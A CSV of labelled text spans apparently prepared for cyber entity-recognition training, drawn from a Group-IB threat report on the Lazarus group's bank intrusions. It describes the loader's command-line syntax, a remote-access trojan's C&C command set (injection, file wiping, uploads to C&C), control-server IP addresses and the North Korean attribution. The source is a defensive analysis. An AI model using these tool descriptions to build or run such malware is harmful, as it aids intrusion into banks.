DocName,text,intent
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," decrypts 
and embeds 
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"

2 31

встраивание 
в систему

встраивание 
в систему

встраивание 
в систему

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution14

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, is used to decrypt the payload — ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, or ,O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," 
— and inject it into the legitimate process (for example, in lsass.exe)

Hackers manually specify the C&C server at the time when the main program 
is started. That’s why even if researchers detect the loader they cannot 
identify where the C&C server is located, by whom it is controlled, and which 
port is used for connection. In some cases, an additional loader was used by 
criminals.  

Example of loader launch:   

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,"

This module was installed on one of the PCs in the internal network of the 
attacked organization. It proxies traffic from C&C server to PCs in the local 
network of the attacked organization.

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

The ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," program provides full control over the target system: it allows 
you to analyze the system, download and execute files, transfer data from the 
infected computer to the C&C server.

Communications with the C&C server are performed over an encrypted SSL 
channel. For this purpose, ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," uses statically linked libcurl libraries, 
version 7.47.1 (",O
Group-IB_Lazarus,FEB 2016,timestamp
Group-IB_Lazarus,").

loader.exe -d «encrypted_payload.bin» -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]

Argument -d:
Name of the file  

where Client _Rat or  
Client_Forwarder are stored 

in encrypted form

Argument -p:
ID of the process (for example, lsass.

exe) in which the payload –  ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," 
or ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," – should be 

embedded

 Two more arguments:
 –r (functionality has not been 

identified) and –s 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution15

This program may execute the following commands received from the C&C 
server:

Command Description

NONE Do not execute any commands

GINF Collect and send extensive 
system information about the 
PC

SLEP Do not execute any commands

HIBN Do not execute any commands

DRIV Get information about available 
disks in the system

DIRP List files with the specified 
extension

CHDR Change current directory

RUNX Get the user token

MOVE Rename specified file

FTIM Set the timestamps of the file 
%windir%/system32/kernel32.dll 
to the specified file

NEWF Create a new directory with the 
specified name

ZDWN Presumably download the file/
files

PEIN Inject code in the specified 
process

TCON Presumably connect to the 
specified network node

DIR List files in the selected 
directory

DIE Remove itself  
from the system

DEL Delete selected file

WIPE Delete the selected file and 
make it unrecoverable

UPLD Upload the file to C&C

SCFG Get a new bot configuration

DRIV Enumerate installed drivers

DOWN Download and run the file

CMDL Run the command and upload 
the result of its work to С&C

GCFG Download bot configuration

RUN Execute command

PVEW List running processes

PEEX Inject the code in the process 
explorer.exe

PKIL Terminate the process with the 
selected PID

DescriptionCommand

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution16

Due to analysis of ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," infrastructure, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have detected 
that the attack was controlled from two IP addresses:

• ",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, belongs to an autonomous system ,O
Group-IB_Lazarus,China Netcom,org
Group-IB_Lazarus,". However, some 
sources indicate that the set of IPs ",O
Group-IB_Lazarus,210.52.109.0/24,ioc
Group-IB_Lazarus, is assigned to ,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,".

• ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, refers to a North Korean Internet service provider. The ,O
Group-IB_Lazarus,Whois,software
Group-IB_Lazarus,"
service indicates that this address is allocated to the Potonggang District, 
perhaps coincidentally, where ",O
Group-IB_Lazarus,Natinal Defence Commission,org
Group-IB_Lazarus," is located — the 

highest military body in ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,"

Through investigation of public information, we came across a TV report 
from a South Korean news agency ",O
Group-IB_Lazarus,Arirang News,org
Group-IB_Lazarus, dated ,O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus," 

On the screen behind the host, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists noticed two IP addresses 
",O
Group-IB_Lazarus,175.45.178.19,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,175.45.178.97,ioc
Group-IB_Lazarus,", which had been used to control ",O
Group-IB_Lazarus,Ghost RAT,malware
Group-IB_Lazarus," 
malware. Both IP addresses are in the same set of IP addresses as an IP address 
",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, that was discovered by ,O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists.

The ",O
Group-IB_Lazarus,South Korea’s National Police Agency,org
Group-IB_Lazarus," reportedly identified that the cyber-
attack had been performed from the unfinished North Korean Ryugyong hotel. 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," could not confirm this location attribution. 

ATTACK 
ORGANIZERS

3.1  Involvement  
of ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus," 

03

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution17

",O
Group-IB_Lazarus,1st Bureau Operations,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,2nd Bureau Reconnaissance,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,3rd Bureau Foreign Intelligence,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,5th Bureau Inter-Korea Dialogue,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,6th Bureau Technical,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,7th Bureau Rear Services,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,"

Starting in ",O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", the ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group tried to mask their activity by 
pretending to be Russian hackers: 

1. The ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," module includes debugging symbols and 
strings containing Russian words in descriptions of commands received by 
malware from the C&C server. 
 
It’s worth noting that ""Russian commands"" received from the server are 
not typical for a Russian native speaker, and in the case of the «poluchit» 
(to receive) command the meaning of the word contradicts the action (to 
send) it is intended for. 
 
 
  
 

2. To protect their executables, hackers used ",O
Group-IB_Lazarus,Enigma Protector,tool
Group-IB_Lazarus,", a commercial 
product, which was created by a Russian software developer.

3. Exploits for ",O
Group-IB_Lazarus,Flash,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus," were borrowed from the sets of exploits 
created by Russian-speaking hackers. 

These techniques to mask attribution initially mislead some researchers 
conducting preliminary analysis.

3.2  Masquerading as Russian hackers

Poluchit (means ""to get"" in Russian)                Send a network address of the current 

Layer 2 server to the C&C server 

The ",O
Group-IB_Lazarus,DarkSeoul,threat_actor
Group-IB_Lazarus, group (aka ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,") is controlled by Bureau 121, a division of the 
",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,", a ",O
Group-IB_Lazarus,North Korean intelligence agency,org
Group-IB_Lazarus,. ,O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus," 
is responsible for conducting military cyber campaigns.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution18

RECOMMENDATIONS04

Updates of software and operating systems

To prevent infection through execution of exploits, it is enough to update 
your ",O
Group-IB_Lazarus,Microsoft,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Adobe,software
Group-IB_Lazarus, software.The ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group uses known and 
patched exploits, rather than leveraging 0day vulnerabilities. That’s why, 
even usual software updates did not allow attackers to infiltrate corporate 
networks. Unfortunately, some of the attacked ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," did not comply with this 
requirement.

Network traffic analysis

Even if the criminals have managed to obtain access to the corporate 
network, the attack can still be successfully prevented. After intrusion into the 
company’s network hackers still need to find systems of their interest, and 
gain access to them. It takes days and even months sometimes, and this time 
should be used to detect the malicious activity.

Attackers use malicious programs that transfer data to the C&C server — 
Layer 1. Communications between the infected computer and the C&C server 
can be identified through network traffic analysis. All communications are 
encrypted, that is why you should use solutions that can detect network 
anomalies based on threat intelligence data.

Application whitelisting

Application whitelisting should be introduced into critical bank servers. This 
will prevent attackers from installing their remote control tools, monitoring 
financial transactions, and escalating privileges. It also helps to identify 
unauthorized attempts to run such malicious applications.

Checking indicators of compromise

The “Indicators of compromise” section contains current and historical 
intelligence data. With these indicators, you can check if your organization 
was, or is, under attack by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,". The group uses legitimate compromised 
servers, that’s why these indicators can give false positives.

Response

And the most important thing: if you have detected trails of a targeted attack 
at any stage, you need to involve specialized companies for its analysis. 
Incorrect responses to the attack result in the attacker activity remaining 
partly undetected to enable criminals to achieve their goal — to steal money.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution19

ABOUT  
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," is one of the global leaders in preventing and investigating high-
tech crimes and online fraud. ",O
Group-IB_Lazarus,Since 2003,timestamp
Group-IB_Lazarus,", the company has been active in the 
field of computer forensics and information security, protecting the largest 
international companies against financial losses and reputational risks.

 
International honors

The company is recognized by ",O
Group-IB_Lazarus,Gartner,org
Group-IB_Lazarus," as a threat intelligence vendor with 
strong cyber security focus and the ability to provide leading insight to the 
Eastern European region and recommended by the ",O
Group-IB_Lazarus,Organization for Security and Co-operation in Europe,org
Group-IB_Lazarus, (,O
Group-IB_Lazarus,OSCE,org
Group-IB_Lazarus,). In ,O
Group-IB_Lazarus,2017,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,IDC,org
Group-IB_Lazarus, Report named ,O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," the 
leader of the Russian Threat Intelligence Services Market. The company is a 
member of the ",O
Group-IB_Lazarus,World Economic Forum,org
Group-IB_Lazarus," working group on cybersecurity.

 
Clients worldwide

Fortune 500 companies worldwide use ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," products and services. 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, clients include top-tier ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,financial,industry
Group-IB_Lazarus," institutions, ",O
Group-IB_Lazarus,FMCG brands,industry
Group-IB_Lazarus," 
and industrial corporations, ",O
Group-IB_Lazarus,oil,industry
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,gas,industry
Group-IB_Lazarus," companies, software and hardware 
vendors, ",O
Group-IB_Lazarus,telecommunications,industry
Group-IB_Lazarus, service providers the ,O
Group-IB_Lazarus,US,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Western Europe,country
Group-IB_Lazarus,", the 
",O
Group-IB_Lazarus,Middle East,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Asia,country
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Australia,country
